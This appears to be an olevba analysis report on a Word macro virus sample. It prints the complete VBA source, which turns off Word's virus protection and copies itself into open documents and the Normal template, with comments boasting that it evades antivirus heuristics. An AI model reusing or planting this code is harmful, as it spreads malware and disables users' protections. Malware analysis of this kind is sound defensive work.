olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Ever
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Ever - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' N3v3R v1.0 by SPo0Ky[CB], 21st June 1999
' SR-1 Compatible MS-Word bug with 5 lines of code.
' Includes "the basic stuff", a small payload which
' would set a random password (though it never gets activated),
' and as a bonus it is even undetectable by F-Prot's and AVP's
' heuristics :-)

Sub AutoClose()
Options.VirusProtection = False ' the basic stuff you asked for :-)
x = ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(1, 100) ' gets the virus's code
If ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines = 0 Then ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines 1, x ' infection check and infection of the activedocument
If NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines = 0 Then NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines 1, x ' infection check and infection of the normaltemplate
If Day(Now) = "N3v3R" Then ActiveDocument.Password = ActiveDocument.Words(1) ' a payload which will never get activated, see it as a payload which actually just wastes time and space! :-)
End Sub







+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

